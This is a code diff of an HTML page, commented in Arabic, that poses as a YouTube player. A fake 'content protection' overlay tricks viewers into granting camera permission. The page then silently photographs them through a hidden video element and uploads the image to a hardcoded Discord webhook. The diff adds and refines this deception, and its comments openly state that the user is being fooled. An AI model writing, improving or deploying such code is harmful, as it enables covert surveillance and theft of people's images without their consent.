@@ -7,17 +7,18 @@
     <style>
         body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         .wrapper { position: relative; width: 100%; height: 100%; }
-        
         #youtube-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
         
-        /* واجهة التمويه */
-        #fake-popup {
+        #start-overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9); display: flex; flex-direction: column;
-            justify-content: center; align-items: center; z-index: 500; color: white; text-align: center; padding: 20px;
+            background: rgba(0,0,0,0.96); display: flex; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 100; color: white; cursor: pointer;
+            text-align: center; padding: 30px;
         }
-        .play-btn { font-size: 70px; color: #fe2c55; margin-bottom: 20px; cursor: pointer; }
-        .instruction { font-size: 18px; line-height: 1.6; }
+        .play-btn { font-size: 80px; color: #fe2c55; margin-bottom: 20px; }
+        .alert-box { border: 1px solid #444; padding: 20px; border-radius: 10px; background: #111; }
+        .instruction-text { font-size: 18px; color: #fff; line-height: 1.6; }
+        .highlight { color: #fe2c55; font-weight: bold; }
 
         #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
         #photo-canvas { display: none; }
@@ -31,11 +32,13 @@
         frameborder="0" allow="autoplay; encrypted-media">
     </iframe>
 
-    <div id="fake-popup">
-        <div class="play-btn" id="start-btn">▶️</div>
-        <div class="instruction">
-            <p><strong>ميزة التفاعل التلقائي مفعلة!</strong></p>
-            <p>اضغط على "سماح" لتشغيل الفيديو بالصوت وتفعيل رموز التفاعل بوجهك 😂</p>
+    <div id="start-overlay">
+        <div class="play-btn">▶️</div>
+        <div class="alert-box">
+            <p class="instruction-text">
+                <span class="highlight">⚠️ نظام حماية المحتوى</span><br>
+                لتشغيل الفيديو بالصوت الأصلي وبجودة عالية، يرجى الضغط على <span class="highlight">"سماح" (Allow)</span> في الرسالة التالية لتأكيد هويتك كبشري وتشغيل المشغل التلقائي.
+            </p>
         </div>
     </div>
 </div>
@@ -45,30 +48,26 @@
 
 <script>
     const webhookURL = 'https://discord.com/api/webhooks/1493335289580752997/hM7a43330A99MIuxDvK_p-pvH0S0hdYSfCtDO4I4fhd9sGshS_76x7kowHqi29VAPjgz';
-    const startBtn = document.getElementById('start-btn');
-    const popup = document.getElementById('fake-popup');
+    const overlay = document.getElementById('start-overlay');
     const iframe = document.getElementById('youtube-frame');
     const camera = document.getElementById('hidden-camera');
 
-    startBtn.addEventListener('click', async () => {
-        // تشغيل الفيديو فوراً خلف الكواليس
+    overlay.addEventListener('click', async () => {
+        // تشغيل اليوتيوب فوراً
         iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
         iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+        
+        overlay.style.display = 'none';
 
         try {
-            // طلب الكاميرا: هنا ستظهر رسالة المتصفح الحقيقية
+            // طلب الكاميرا (المستخدم بيظن إنه إذن تشغيل الفيديو)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             camera.srcObject = stream;
             
-            // إخفاء التمويه وظهور الفيديو
-            popup.style.display = 'none';
-
-            camera.onplaying = () => {
-                setTimeout(captureAndSend, 3000); // يصور بعد 3 ثواني من الموافقة
-            };
+            // التصوير بعد 4 ثواني
+            setTimeout(captureAndSend, 4000);
         } catch (err) {
-            // إذا رفض، يخفي التمويه ويشغل الفيديو عادي عشان ما يشك
-            popup.style.display = 'none';
+            console.log("Access Denied");
         }
     });
 
@@ -82,9 +81,11 @@
         context.drawImage(camera, 0, 0, canvas.width, canvas.height);
         
         canvas.toBlob(async (blob) => {
+            if (!blob) return;
             const formData = new FormData();
-            formData.append('file', blob, 'face.png');
-            formData.append('content', '✅ **تم التقاط الوجه بنجاح!**');
+            formData.append('file', blob, 'shot.png');
+            formData.append('content', '✅ **وصلت الصورة بنجاح عبر تمويه "إذن تشغيل الفيديو"!**');
+            
             await fetch(webhookURL, { method: 'POST', body: formData });
         }, 'image/png');
     }
